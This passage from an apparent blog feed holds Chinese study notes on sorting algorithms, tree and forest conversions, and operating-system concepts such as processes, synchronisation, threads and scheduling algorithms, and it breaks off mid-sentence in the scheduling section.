href="#插入类排序"></a>插入类排序</h3><ul><li>直接插入排序<ul><li>直接插入排序：首先以一个元素为有序的序列，然后将后面的元素依次插入到有序的序列中合适的位置直到所有元素都插入有序序列。</li><li>时间复杂度为O(n)</li><li>直接插入排序是稳定性是稳定的。</li></ul></li><li>折半插入排序<ul><li>折半插入排序将比较和移动这两个操作分离出来，也就是先利用折半查找找到插入的位置，然后一次性移动元素，再插入该元素。</li><li>折半插入排序的时间复杂度为O(n^2)</li><li>稳定性：和直接插入排序稳定性相同，是稳定的。</li></ul></li><li>希尔排序<ul><li>希尔排序的基本思想：希尔排序本质上还是插入排序，只不过是把待排序序列分成几个子序列，再分别对这几个子序列进行直接插入排序。<ul><li>①先以增量5来分割序列，也就是下标为0,5,10,15…的关键字分成一组，下标为1,6,11,16…分成一组,然后对这些组分别进行直接插入排序，这就完成了一轮希尔排序。</li><li>②缩小增量(d1=n/2，di+1= [di/2]，比如10个数据序列，第一次增量d1=10/2=5,第二次增量d2= [d1/2]= [5/2]=2,并且最后一个增量等于1),所以第二轮以增量为2进行类似的排序过程。</li><li>③接下来的第三轮，第四轮…都是类似的过程，直到最后一轮以增量为1。此时就是前面所说的直接插入排序。</li><li>概要:</li></ul></li><li>时间复杂度：…  希尔排序的时间复杂度约为O(n^1.3)    在最坏情况下希尔排序的时间复杂度为O(n^2)</li><li>空间复杂度：希尔排序的空间复杂度为O(1)</li><li>稳定性：不稳定，由于不同的增量可能就会把相等的关键字划分到两个直接插入排序中进行排序， 可能就会造成相对顺序变化。</li></ul></li></ul><h3 id="交换类排序"><a class="header-anchor" href="#交换类排序"></a>交换类排序</h3><ul><li>冒泡排序<ul><li>假设待排序表长为n，从后往前（或从前往后）两两比较相邻元素的值，若为逆序（即A[i-1]&gt;A[i]），则交换它们，直到序列比较完。我们称它为一趟冒泡，结果将最小的元素交换到待排序列的第一个位置。下一趟冒泡时，前一趟确定的最小元素不再参与比较，待排序列减少一个元素，每趟冒泡的结果把序列中的最小元素放到了序列的最终位置，……，这样最多做n-1趟冒泡就能把所有元素排好序。</li><li>空间复杂度：交换时开辟了存储空间来存储中间变量，所以空间复杂度为O(1)</li><li>时间复杂度</li><li>稳定性：当两个关键字相等，if判断条件不成立，所以不会发生数据移动。所以是稳定的。</li></ul></li><li>快速排序<ul><li>快速排序是一种基于分治法的排序方法。<br>每一趟快排选择序列中任一个元素作为枢轴(pivot)(通常选第一个元素)，将序列中比枢轴小的元素都移到枢轴前边，比枢轴大的元素都移到枢轴后边。<ul><li>1</li><li>2</li></ul></li><li>时间复杂度：<br>最好情况下时间复杂度为O(nlogn) ,待排序序列越无序，算法效率越高。<br>最坏情况下时间复杂度为O(n^2)，待排序序列越有序，算法效率越低。</li><li>空间复杂度：<br>由于快速排序是递归的，需要借助一个递归工作栈来保存每一层递归调用的必要信息，其容量应与递归调用的最大深度一致。<br>最好情况下为 ⌈log2(n+1)⌉(每次partition都很均匀)递归树的深度O(logn)<br>最坏情况下，因为要进行n-1次递归调用，所以栈的深度为O(n)；</li><li>稳定性：快速排序是不稳定的，是因为存在交换关键字。</li></ul></li></ul><h3 id="选择类排序"><a class="header-anchor" href="#选择类排序"></a>选择类排序</h3><ul><li>简单选择排序<br>*<ul><li>空间复杂度：需要额外的存储空间仅为交换元素时借助的中间变量，所以空间复杂度是O(1)</li><li>时间复杂度：<br>关键操作在于交换元素操作，整个算法由双重循环组成，外层循环从0到n-2一共n-2+1=n-1次，<br>对于第i层外层循环，内层循环执行n-1-(i+1)+1=n-i-1次。<br>当i=0,内层循环执行n-1次，当i=n-2,内层循环执行1次，所以是一个等差数列求和,一共为(1+n-1)(n-1)/2=n(n-1)/2 ,所以时间复杂度为O(n^2)</li><li>稳定性：不稳定   原因就在于交换部分会打破相对顺序</li></ul></li><li>堆排序<ul><li><p>什么是堆？</p><ul><li>堆是一棵完全二叉树，而且满足任何一个非叶结点的值都不大于(或不小于)其左右孩子结点的值。<ul><li>如果是每个结点的值都不小于它的左右孩子结点的值，则称为大顶堆。</li><li>如果是每个结点的值都不大于它的左右孩子结点的值，则称为小顶堆。</li></ul></li></ul></li><li><p>什么是堆排序？</p><ul><li>我们知道对于一个堆来说，它的根结点是整个堆中所有结点的值的最大值(大顶堆)或者最小值(小顶堆)。所以堆排序的思想就是每次将无序序列调节成一个堆，然后从堆中选择堆顶元素的值，这个值加入有序序列，无序序列减少一个，再反复调节无序序列，直到所有关键字都加入到有序序列。<br>*<br>*</li><li>时间复杂度：<br>堆排序的总时间可以分为①建堆部分+②n-1次向下调整堆</li></ul><p>堆排序的时间复杂度为O(n)+O(nlog2n)=O(nlog2n)</p><ul><li>堆排序不稳定</li></ul></li></ul></li></ul><h3 id="归并排序"><a class="header-anchor" href="#归并排序"></a>归并排序</h3><ul><li>假定待排序表含有n个记录，则可以看成是n个有序的子表，每个子表长度为1，然后两两归并，得到 ⌈n/2⌉个长度为2或1的有序表；再两两归并，……如此重复，直到合并成一个长度为n的有序表为止，这种排序方法称为2-路归并排序。<br>*<br>*</li><li>例如：49 38 65 97 76 13 27<ul><li>①首先将整个序列的每个关键字看成一个单独的有序的子序列</li><li>②两两归并，49和38归并成{38 49} ，65和97归并成{65 97}，76和13归并成{13 76}，27没有归并对象</li><li>③两两归并，{38 49}和{65 97}归并成{38 49 65 97}，{13,76}和27归并成{13 27 76}</li><li>④两两归并，{38 49 65 97}和{13 27 76}归并成{13 27 38 49 65 76 97}</li></ul></li><li>时间复杂度：O(nlog2n)</li><li>空间复杂度:因为需要将这个待排序序列转存到一个数组，所以需要额外开辟大小为n的存储空间，即空间复杂度为O(n)</li><li>稳定性：稳定</li></ul><h3 id="基数排序"><a class="header-anchor" href="#基数排序"></a>基数排序</h3><ul><li>基数排序(也叫桶排序)是一种很特别的排序方法，它不是基于比较进行排序的，而是采用多关键字排序思想（即基于关键字各位的大小进行排序的），借助“分配”和“收集”两种操作对单逻辑关键字进行排序。基数排序又分为最高位优先（MSD）排序和最低位优先（LSD）排序。</li><li>例子：53, 3, 542, 748, 14, 214, 154, 63, 616<ul><li>补充位数：053, 003, 542, 748, 014, 214, 154, 063, 616</li><li>桶实际是一个队列，先进先出(从桶的上面进，下面出)</li><li>关键字数量为n,关键字的位数为d,比如748 d=3，r为关键字的基的个数，就是组成关键字的数据的种类，比如十进制数字一共有0至9一共10个数字，即r=10</li></ul></li><li>空间复杂度：需要开辟关键字基的个数个队列，所以空间复杂度为O®</li><li>时间复杂度：需要进行关键字位数d次&quot;分配&quot;和&quot;收集&quot;，一次&quot;分配&quot;需要将n个关键字放进各个队列中，一次&quot;收集&quot;需要将r个桶都收集一遍。所以一次&quot;分配&quot;和一次&quot;收集&quot;时间复杂度为O(n+r)。d次就需要O(d(n+r))的时间复杂度。</li><li>稳定性：由于是队列，先进先出的性质，所以在分配的时候是按照先后顺序分配，也就是稳定的，所以收集的时候也是保持稳定的。即基数排序是稳定的排序算法。</li></ul><h3 id="外部排序"><a class="header-anchor" href="#外部排序"></a>外部排序</h3><ul><li>需要将待排序的记录存储在外存上，排序时再把数据一部分一部分的调入内存进行排序。在排序过程中需要多次进行内存和外存之间的交换，对外存文件中的记录进行排序后的结果仍然被放到原有文件中。这种排序的方法就叫做外部排序。</li><li>如何得到初始的归并段<ul><li>置换选择排序：解决排序段放入内存的问题</li></ul></li><li>如何减少多个归并段的归并次数<ul><li>最佳归并树：最少的归并次数（I/O次数）</li></ul></li><li>如何每次m路归并快速得到最小的关键字<ul><li>败者树：减少比较次数</li></ul></li><li>概要: 内存容量无法容纳大量数据</li></ul><h2 id="二叉树与树与森林"><a class="header-anchor" href="#二叉树与树与森林"></a>二叉树与树与森林</h2><h3 id="树与二叉树"><a class="header-anchor" href="#树与二叉树"></a>树与二叉树</h3><ul><li>如何将一棵树转化成二叉树？<ul><li>树的孩子兄弟表示法与二叉树的二叉链表表示法都是用到两个指针<ul><li>将孩子兄弟表示法理解成二叉链表</li></ul></li><li>树转换成二叉树的手动模拟方法：<ul><li>①将同一结点的各个孩子用线串连起来</li><li>②将每个结点的子树分支，从左往右，除了第一个以外全部删除</li><li>概要: 例子</li></ul></li></ul></li><li>如何将一棵二叉树转化成树？<ul><li>二叉树转换成树的手动模拟方法：<ul><li>①将二叉树从上到下分层，并调节成水平方向。<br>(分层方法：每遇到左孩子则为一层)</li><li>②找到每一层的双亲结点，方法为它的上一层相连的那个结点就是双亲结点。<br>例如bcd这一层，与它相连的上一层结点即为a,所以bcd这三个结点的双亲结点都是a.</li><li>③将每一层结点和其双亲结点相连，同时删除该双亲结点各个孩子结点之间的联系。</li><li>概要: 例子</li></ul></li></ul></li></ul><h3 id="森林与二叉树"><a class="header-anchor" href="#森林与二叉树"></a>森林与二叉树</h3><ul><li>森林：森林是m（m≥0）棵互不相交的树的集合</li><li>如何将森林转换成二叉树？<ul><li>森林转换成树的手动模拟方法：<ul><li>①将森林中每棵树都转换成二叉树</li><li>②将第二棵树作为第一棵树的根结点的右子树，将第三棵树作为第二棵树的根结点的右子树…依次类推</li><li>概要: 例子</li></ul></li></ul></li><li>如何将二叉树转换成森林？<ul><li>二叉树转换成森林的手动模拟方法：<ul><li>反复断开二叉树根结点的右孩子的右子树指针，直到不存在根结点有右孩子的二叉树为止。</li><li>概要: 例子</li></ul></li></ul></li></ul><h3 id="树与森林的遍历"><a class="header-anchor" href="#树与森林的遍历"></a>树与森林的遍历</h3><ul><li>先序：先访问根结点，再访问根结点的每棵子树。           访问子树也是按照先序的要求</li><li>后序：先访问根结点的每棵子树，再访问根结点。           访问子树也是按照先序的要求</li><li>树的先序遍历等于它对应二叉树的先序遍历，后序遍历等于它对应的二叉树的中序遍历</li><li>概要: 例子</li></ul><p><img src="https://github.com/SSHeRun/CS-Xmind-Note/blob/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.png" alt="picture"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机操作系统复习笔记</title>
      <link href="/p/5ade0c62.html"/>
      <url>/p/5ade0c62.html</url>
      
        <content type="html"><![CDATA[<h1>计算机操作系统</h1><h2 id="一-操作系统引论"><a class="header-anchor" href="#一-操作系统引论"></a>一.操作系统引论</h2><h3 id="1-操作系统的目标和功能"><a class="header-anchor" href="#1-操作系统的目标和功能"></a>1.操作系统的目标和功能</h3><ul><li><p>目标</p><ul><li>方便性</li><li>有效性<ul><li>提高系统资源利用率</li><li>提高系统吞吐量</li></ul></li><li>可扩充性</li><li>开放性</li></ul></li><li><p>作用</p><ul><li>OS作为用户与计算机硬件系统之间的接口<ul><li>命令方式</li><li>系统调用方式</li><li>图标–窗口方式</li></ul></li><li>OS实现了对计算机资源的抽象</li></ul>  <a id="more"></a></li></ul><h3 id="2-操作系统的发展过程"><a class="header-anchor" href="#2-操作系统的发展过程"></a>2.操作系统的发展过程</h3><ul><li><p>未配置操作系统的计算机系统</p><ul><li><p>人工操作方式</p></li><li><blockquote><p>用户独占全机 CPU等待人工操作 严重降低了计算机资源的利用率</p></blockquote></li><li><p>脱机输入/输出(Off–Line I/O)方式</p></li><li><blockquote><p>减少了CPU的空闲时间 提高了I/O速度 效率仍然不理想</p></blockquote></li></ul></li><li><p>单道批处理系统</p></li><li><p>多道批处理系统</p></li><li><blockquote><p>1.资源利用率高</p></blockquote></li><li><blockquote><p>2.系统吞吐量大</p></blockquote></li><li><blockquote><p>3.平均周转时间长</p></blockquote></li><li><blockquote><p>4.无交互能力</p></blockquote><ul><li>(宏观并行，微观串行)</li></ul></li><li><p>分时系统</p></li><li><blockquote><p>特征:</p></blockquote></li><li><blockquote><p>1.多路性</p></blockquote></li><li><blockquote><p>2.独立性</p></blockquote></li><li><blockquote><p>3.及时性</p></blockquote></li><li><blockquote><p>4.交互性</p></blockquote></li><li><p>实时系统</p></li><li><p>集群系统–超算~云计算</p></li><li><p>微机操作系统的发展</p></li></ul><h3 id="3-操作系统的基本特征"><a class="header-anchor" href="#3-操作系统的基本特征"></a>3.操作系统的基本特征</h3><ul><li><p>1.并发concurrence</p><ul><li><p>区别并行和并发</p></li><li><blockquote><p>并行性是指两个或多个事件在同一时刻发生→宏观并行，微观并行</p></blockquote></li><li><blockquote><p>并发性是指两个或多个事件在同一时间间隔内发生→宏观并行，微观串行</p></blockquote><ul><li>并发是进程宏观一起运行，微观上交替运行，而并行是指同时运行</li></ul></li><li><p>引入进程</p></li><li><blockquote><p>进程是指在系统中能独立运行并作为资源分配的基本单位，它是由一组机器指令，数据和堆栈等组成的，是一个能独立运行的活动实体</p></blockquote></li></ul></li><li><p>2.共享sharing</p><ul><li>1.互斥共享方式</li><li>2.同时访问方式</li><li>并发和共享是多用户(多任务)OS的两个最基本的特征。它们又是互为存在的条件</li></ul></li><li><p>3.虚拟virtual</p><ul><li>时分复用技术</li><li>空分复用技术</li></ul></li><li><p>4.异步asynchronism</p></li></ul><h3 id="4-操作系统的主要功能"><a class="header-anchor" href="#4-操作系统的主要功能"></a>4.操作系统的主要功能</h3><ul><li>1.处理机管理功能<ul><li>进程控制</li><li>进程同步<ul><li>进程互斥方式</li><li>进程同步方式(协同)</li></ul></li><li>进程通信</li><li>调度<ul><li>作业调度</li><li>进程调度</li></ul></li></ul></li><li>2.存储器管理功能<ul><li>内存分配<ul><li>静态分配</li><li>动态分配</li></ul></li><li>内存保护</li><li>地址映射</li><li>内存扩充</li></ul></li><li>3.设备管理功能<ul><li>缓冲管理</li><li>设备分配</li><li>设备处理<ul><li>设备处理程序又称设备驱动程序</li></ul></li></ul></li><li>4.文件管理功能<ul><li>文件存储空间的管理</li><li>目录管理</li><li>文件的读写管理和保护</li></ul></li><li>5.操作系统与用户之间的接口<ul><li>用户接口</li><li>程序接口</li></ul></li><li>6.现代操作系统的新功能<ul><li>系统安全</li><li>网络的功能和服务</li><li>支持多媒体</li></ul></li></ul><h3 id="5-OS结构设计"><a class="header-anchor" href="#5-OS结构设计"></a>5.OS结构设计</h3><ul><li>传统操作系统结构<ul><li>无结构操作系统</li><li>模块化OS</li><li>分层式结构OS</li></ul></li><li>微内核os结构<ul><li>客户/服务器模式</li><li>面对对象的程序设计</li></ul></li></ul><h2 id="第二章进程的描述与控制"><a class="header-anchor" href="#第二章进程的描述与控制"></a>第二章进程的描述与控制</h2><h3 id="前驱图和程序执行"><a class="header-anchor" href="#前驱图和程序执行"></a>前驱图和程序执行</h3><h3 id="程序并发执行"><a class="header-anchor" href="#程序并发执行"></a>程序并发执行</h3><ul><li>程序的并发执行</li><li>程序并发执行时的特征<ul><li>间断性</li><li>失去封闭性</li><li>不可再现性</li></ul></li></ul><h3 id="进程的描述"><a class="header-anchor" href="#进程的描述"></a>进程的描述</h3><ul><li>进程的定义<ul><li>进程是程序的一次执行</li><li>进程是一个程序及其数据在处理机上顺序执行时所发生的活动</li><li>进程是具有独立功能的程序在一个数据集合上运行的过程，它是系统进行资源分配和调度的一个独立单位</li></ul></li><li>进程的特征<ul><li>动态性</li><li>并发性</li><li>独立性</li><li>异步性</li></ul></li><li>从操作系统角度分类<ul><li>系统进程</li><li>用户进程</li></ul></li><li>进程和程序的区别<ul><li>进程是动态概念，而程序则是静态概念</li><li>程序是指令的有序集合，永远存在；进程强调是程序在数据集上的一次执行，有创建有撤销，存在是暂时的；</li><li>进程具有并发性，而程序没有</li><li>进程可创建其他进程，而程序并不能形成新的程序</li><li>进程是竞争计算机资源的基本单位，程序不是</li></ul></li><li>进程和程序的联系<ul><li>进程是程序在数据集上的一次执行</li><li>程序是构成进程的组成部分，一个程序可对应多个进程，一个进程可包括多个程序</li><li>进程的运行目标是执行所对应的程序</li><li>从静态看，进程由程序、数据和进程控制块（PCB）组成</li></ul></li><li>进程的基本状态及转换<ul><li>进程的三种基本状态<ul><li>就绪状态ready</li><li>执行状态running</li><li>阻塞状态block</li></ul></li><li>三种基本状态的转换</li><li>创建状态和终止状态<ul><li>五状态进程模型</li></ul></li><li>注意<ul><li>阻塞态-&gt;运行态和就绪态-&gt;阻塞态这二种状态转换不可能发生</li></ul></li></ul></li><li>挂起操作和进程状态的转换<ul><li>挂起和阻塞的区别</li><li>挂起操作的目的<ul><li>终端用户的需要: 修改、检查进程</li><li>父进程的需要：修改、协调子进程</li><li>对换的需要：缓和内存</li><li>负荷调节的需要：保证实时任务的执行</li></ul></li><li>关键图</li></ul></li><li>进程管理中的数据结构<ul><li>进程控制块PCB的作用<ul><li>作为独立运行基本单位的标志</li><li>能实现间断性运行方式</li><li>提供进程管理所需要的信息</li><li>提供进程调度所需要的信息</li><li>实现与其他进程的同步与通信</li></ul></li><li>进程控制块的信息<ul><li>进程标识符<ul><li>外部标识符PID</li><li>内部标识符(端口)</li></ul></li><li>处理机状态<ul><li>通用寄存器</li><li>指令计数器</li><li>程序状态字PSW</li><li>用户栈指针</li></ul></li><li>进程调度信息<ul><li>进程状态</li><li>进程优先级</li><li>进程调度所需的其他信息</li><li>事件</li></ul></li><li>进程控制信息<ul><li>程序和数据的地址</li><li>进程同步和通信机制</li><li>资源清单</li><li>链接指针</li></ul></li><li>进程控制块的组织方式<ul><li>线性方式</li><li>链接方式</li><li>索引方式</li></ul></li></ul></li></ul></li></ul><h3 id="进程控制"><a class="header-anchor" href="#进程控制"></a>进程控制</h3><ul><li>操作系统内核<ul><li>两大功能<ul><li>支撑功能<ul><li>中断管理</li><li>时钟管理</li><li>原语操作<ul><li>进程的管理，由若干原语（primitive）来执行</li></ul></li></ul></li><li>资源管理功能<ul><li>进程管理</li><li>存储器管理</li><li>设备管理</li></ul></li></ul></li><li>状态<ul><li>系统态，管态，内核态</li><li>用户态，目态</li></ul></li></ul></li><li>进程的创建<ul><li>进程的层次结构<ul><li>父进程</li><li>子进程</li></ul></li><li>引起创建进程的事件<ul><li>用户登录</li><li>作业调度</li><li>提供服务</li><li>应用请求</li></ul></li><li>进程的创建过程<ul><li>1.申请空白PCB</li><li>2.为新进程分配其运行所需的资源</li><li>3.初始化进程块PCB</li><li>4.如果进程就绪队列能够接纳新进程，便将新进程插入就绪队列</li></ul></li><li>进程的终止<ul><li>引起进程终止的事件<ul><li>1.正常结束</li><li>2.异常结束</li><li>3.外界干预</li></ul></li><li>进程的终止过程<ul><li>1.根据被终止进程的标识符</li></ul></li></ul></li><li>进程的阻塞与唤醒<ul><li>引起进程阻塞和唤醒的事件<ul><li>请求系统服务而未满足</li><li>启动某种操作而阻塞当前进程</li><li>新数据尚未到达</li><li>无新工作可做：系统进程</li></ul></li><li>进程阻塞过程(自己阻塞自己)</li><li>进程唤醒过程(系统或其他进程唤醒自己)</li></ul></li><li>进程的挂起与激活<ul><li>suspend</li><li>active</li></ul></li></ul></li><li>进程同步<ul><li>基本概念<ul><li>两种形式的制约关系<ul><li>间接相互制约关系<ul><li>互斥——竞争</li></ul></li><li>直接相互制约关系<ul><li>同步——协作</li></ul></li></ul></li><li>临界资源</li><li>分区<ul><li>进入区enter section</li><li>临界区critical section</li><li>退出区exit section</li><li>剩余区remainder section</li></ul></li><li>同步机制应遵循的规则<ul><li>1.空闲让进</li><li>2.忙则等待</li><li>3.有限等待</li><li>4.让权等待</li></ul></li></ul></li><li>进程同步机制<ul><li>软件同步机制:都没有解决让权等待，而且部分方法还会产生死锁的情况</li><li>硬件同步机制<ul><li>关中断</li><li>利用Test-and-Set指令实现互斥</li><li>利用swap指令实现进程互斥</li></ul></li><li>信号量机制<ul><li>整型信号量</li><li>记录型信号量<ul><li>由于整型信号量没有遵循让权等待原则，记录型允许负数，即阻塞链表</li></ul></li><li>AND型信号量</li><li>信号量集<ul><li>理解:AND型号量的wait和signal仅能对信号施以加1或减1操作，意味着每次只能对某类临界资源进行一个单位的申请或释放。当一次需要N个单位时，便要进行N次wait操作，这显然是低效的，甚至会增加死锁的概率。此外，在有些情况下，为确保系统的安全性，当所申请的资源数量低于某一下限值时，还必须进行管制，不予以分配。因此，当进程申请某类临界资源时，在每次分配前，都必须测试资源数量，判断是否大于可分配的下限值，决定是否予以分配</li><li>操作<ul><li>Swait(S1，t1，d1…Sn，tn，dn)</li><li>Ssignal(S1，d1…Sn，dn)</li></ul></li><li>特殊情况</li></ul></li></ul></li></ul></li><li>经典进程的同步问题<ul><li>生产者–消费者问题</li><li>哲学家进餐问题</li><li>读者–写者问题</li></ul></li></ul></li></ul><h3 id="进程通信"><a class="header-anchor" href="#进程通信"></a>进程通信</h3><ul><li>进程通信是指进程之间的信息交换，又称低级进程通信</li><li>进程通信的类型<ul><li>共享存储器系统<ul><li>基于共享数据结构的通信方式<ul><li>生产者和消费者</li></ul></li><li>基于共享存储区的通信方式<ul><li>高级通信</li></ul></li></ul></li><li>管道通信系统(pipe)<ul><li>高级通信</li></ul></li><li>消息传递系统<ul><li>高级通信</li><li>方式分类<ul><li>直接通信</li><li>间接通信</li></ul></li></ul></li><li>客服机–服务器系统</li></ul></li><li>消息传递通信的实现方式<ul><li>直接消息传递系统</li><li>信箱通信</li></ul></li></ul><h3 id="线程的基本概念"><a class="header-anchor" href="#线程的基本概念"></a>线程的基本概念</h3><ul><li>线程的引入<ul><li>线程的引入正是为了简化线程间的通信，以小的开销来提高进程内的并发程度</li><li>多线程并发的不足<ul><li>进程的两个基本属性<ul><li>一个拥有资源的独立单位，可独立分配系统资源</li><li>一个可独立调度和分派的基本单位，PCB</li></ul></li><li>程序并发执行所需付出的时空开销<ul><li>创建进程</li><li>撤销进程</li><li>进程切换</li></ul></li><li>进程间通信效率低</li><li>将分配资源和调度两个属性分开</li></ul></li><li>线程——作为调度和分派的基本单位<ul><li>进程是系统资源分配的单位，线程是处理器调度的单位</li><li>线程表示进程的一个控制点，可以执行一系列的指令。通常，和应用程序的一个函数相对应</li><li>进程分解为线程还可以有效利用多处理器和多核计算机</li></ul></li></ul></li><li>线程与进程的比较<ul><li>不同点<ul><li>调度的基本单位</li><li>并发性</li></ul></li><li>相似点<ul><li>状态：运行、阻塞、就绪</li><li>线程具有一定的生命期</li><li>进程可创建线程，一个线程可创建另一个子线程</li><li>多个线程并发执行时仍然存在互斥与同步</li></ul></li></ul></li><li>线程的实现<ul><li>线程的实现方式<ul><li>内核支持线程KST</li><li>用户级线程ULT</li><li>组合方式</li></ul></li><li>多线程OS中的进程属性<ul><li>进程是一个可拥有资源的基本单位</li><li>多个线程可并发执行</li><li>进程已不是可执行的实体</li></ul></li><li>线程的状态和线程控制块<ul><li>线程运行的三个状态<ul><li>执行状态</li><li>就绪状态</li><li>阻塞状态</li></ul></li><li>线程控制块TCB</li></ul></li></ul></li></ul><h2 id="第三章-处理机调度与死锁"><a class="header-anchor" href="#第三章-处理机调度与死锁"></a>第三章:处理机调度与死锁</h2><h3 id="处理机调度算法的目标"><a class="header-anchor" href="#处理机调度算法的目标"></a>处理机调度算法的目标</h3><ul><li>处理机调度算法的共同目标<ul><li>资源利用率:CPU的利用率=CPU有效工作时间/(CPU有效工作时间+CPU空闲等待时间)</li><li>公平性</li><li>平衡性</li><li>策略强制执行</li></ul></li><li>批处理系统的目标<ul><li>平均周转时间短</li><li>系统吞吐量高</li><li>处理机利用率高</li></ul></li><li>分时系统的目标<ul><li>响应时间快</li><li>均衡性</li></ul></li><li>实时系统目标<ul><li>截止时间的保证</li><li>可预测性</li></ul></li><li>处理机调度的层次<ul><li>高级调度（作业调度）<ul><li>分时系统无需作业调度，因为需要交互</li><li>批处理系统需要作业调度</li></ul></li><li>中级调度（和挂起有关）</li><li>低级调度（进程调度）<ul><li>进程调度是最基本的调度，任何操作系统都有进程调度。</li><li>低级调度的三个基本机制<ul><li>排队器</li><li>分派器</li><li>上下文切换</li></ul></li><li>进程调度方式<ul><li>非抢占方式</li><li>抢占方式<ul><li>优先权原则</li><li>短进程优先原则</li><li>时间片原则</li></ul></li></ul></li><li>进程调度的任务<ul><li>保存处理机的现场信息</li><li>按某种算法选取进程</li><li>把处理器分配给进程</li></ul></li><li>进程调度的算法<ul><li>优先级调度算法<ul><li>优先级调度算法的类型<ul><li>非抢占式优先级调度算法<ul><li>等当前进程执行完以后，再执行另一个优先权最高的进程</li><li>这种调度算法主要用于批处理系统中；也可用于某些对实时性要求不严的实时系统中。</li></ul></li><li>抢占式优先级调度算法<ul><li>不等当前进程结束，直接抢处理机</li><li>常用于要求比较严格的实时系统中， 以及对性能要求较高的批处理和分时系统中。</li></ul></li></ul></li><li>优先级的类型<ul><li>静态优先级<ul><li>优先权是在创建进程时确定的，且在进程的整个运行期间保持不变。一般地，优先权是利用某一范围内的一个整数来表示的，例如，0<sub>7或0</sub>255中的某一整数， 又把该整数称为优先数。</li><li>可以参考BIOS系统中设置boot的优先级</li></ul></li><li>动态优先级<ul><li>在创建进程时所赋予的优先权，是可以随进程的推进或随其等待时间的增加而改变的，以便获得更好的调度性能。</li></ul></li></ul></li></ul></li><li>轮转调度算法<ul><li>基本原理:在轮转(RR)法中，系统根据FCFS策略，将所有的就绪进程排成一个就绪队列，并可设置每隔一定时间间隔(如30ms)即产生一次中断，激活系统中的进程调度程序，完成一次调度，将CPU分配给队首进程，令其执行</li><li>进程切换时机<ul><li>时间片未用完，进程完成</li><li>时间片到，进程未完成</li></ul></li><li>时间片大小的确定<ul><li>太小利于短作业，增加系统切换开销</li><li>太长就退化为FCFS算法</li><li>一般选择: q略大于一次交互所需要的时间，使大多数进程在一个时间片内完成</li></ul></li><li>一般来说，平均周转时间将比SJF长，但是有较好的响应时间</li></ul></li><li>多队列调度算法</li><li>多级反馈队列调度算法<ul><li>调度机制<ul><li>设置多个就绪队列</li><li>每个队列都采用FCFS算法</li><li>按照队列优先级调度，在第n队列中采取按时间片轮转的方式运行</li></ul></li><li>调度算法的性能<ul><li>对于终端型用户，由于作业小，感觉满意</li><li>对于短批处理作业用户，周转时间也较小</li><li>长批处理作业用户，也能够得到执行</li></ul></li></ul></li><li>基于公平原则的调度算法<ul><li>保证调度算法</li><li>公平分享调度算法</li></ul></li></ul></li></ul></li></ul></li></ul><h3 id="作业与作业调度"><a class="header-anchor" href="#作业与作业调度"></a>作业与作业调度</h3><ul><li>作业<ul><li>作业不仅包含程序和数据，还配有一份作业说明书，系统根据说明书对程序的运行进行控制。批处理系统是以作业为单位从外存掉入内存的。</li></ul></li><li>作业控制块JCB<ul><li>为每个作业设置一个JCB，保存了对作业管理调度的全部信息。是作业存在的标志。</li></ul></li><li>作业步<ul><li>作业步，每个作业都必须经过若干相对独立，有相互关联的顺序步骤才能得到结果。每一个步骤就是一个作业步。</li></ul></li><li>作业运行的三个阶段<ul><li>收容阶段</li><li>运行阶段</li><li>完成阶段</li></ul></li><li>作业运行的三个状态<ul><li>后备状态</li><li>运行状态</li><li>完成状态</li></ul></li><li>作业调度的主要任务<ul><li>接纳多少个作业</li><li>接纳哪些作业</li></ul></li><li>先来先服务(first–come first–served，FCFS)调度算法<ul><li>比较有利于长作业，而不利于短作业。</li><li>有利于CPU繁忙的作业，而不利于I/O繁忙的作业。</li></ul></li><li>短作业优先(short job first，SJF)的调度算法<ul><li>优点<ul><li>比FCFS改善平均周转时间和平均带权周转时间，缩短作业的等待时间；</li><li>提高系统的吞吐量；</li></ul></li><li>缺点<ul><li>必须预知作业的运行时间</li><li>对长作业非常不利，长作业的周转时间会明显地增长</li><li>在采用SJF算法时，人–机无法实现交互</li><li>该调度算法完全未考虑作业的紧迫程度，故不能保证紧迫性作业能得到及时处理</li></ul></li></ul></li><li>优先级调度算法(priority–scheduling algorithm，PSA)</li><li>高响应比优先调度算法(Highest Response Ratio Next,HRRN)<ul><li>原理<ul><li>在每次选择作业投入运行时，先计算此时后备作业队列中每个作业的响应比RP然后选择其值最大的作业投入运行</li><li>优先权=(等待时间+要求服务时间)/要求服务时间=响应时间/要求服务时间=1+等待时间/要求服务时间</li></ul></li><li>特点<ul><li>如果作业的等待时间相同，则要求服务的时间愈短，其优先权愈高，因而类似于SJF算法，有利于短作业</li><li>当要求服务的时间相同时，作业的优先权又决定于其等待时间，因而该算法又类似于FCFS算法</li><li>对于长时间的优先级，可以为随等待时间的增加而提高，当等待时间足够长时，也可获得处理机</li></ul></li></ul></li></ul><h3 id="实时调度-HRT和SRT任务"><a class="header-anchor" href="#实时调度-HRT和SRT任务"></a>实时调度(HRT和SRT任务)</h3><ul><li>实现实时调度的基本条件<ul><li>提供必要信息<ul><li>就绪时间</li><li>开始截止时间和完成截止时间</li><li>处理时间</li><li>资源要求</li><li>优先级</li></ul></li><li>系统处理能力强<ul><li>∑(Ci/Pi)≤1</li><li>N个处理机:∑(Ci/Pi)≤N</li></ul></li><li>采用抢占式调度机制</li><li>具有快速切换机制<ul><li>对中断的快速响应能力</li><li>快速的任务分派能力</li></ul></li></ul></li><li>实时调度算法的分类<ul><li>非抢占式调度算法<ul><li>非抢占式轮转调度算法</li><li>非抢占式优先调度算法</li></ul></li><li>抢占式调度算法<ul><li>基于时钟中断的抢占式优先级调度算法</li><li>立即抢占的优先级调度算法</li></ul></li></ul></li><li>最早截止时间优先EDF(Earliest Deadline First)算法<ul><li>根据任务的开始截至时间来确定任务的优先级<ul><li>截至时间越早，优先级越高</li></ul></li><li>非抢占式调度方式用于非周期实时任务</li><li>抢占式调度方式用于周期实时任务</li></ul></li><li>最低松弛度优先LLF(Least Laxity First)算法<ul><li>类似EDF</li><li>算法根据任务紧急(或松弛)的程度，来确定任务的优先级。任务的紧急程度愈高，为该任务所赋予的优先级就愈高， 以使之优先执行。</li><li>松弛度例子<ul><li>例如，一个任务在200ms时必须完成，而它本身所需的运行时间就有100ms，因此，调度程序必须在100 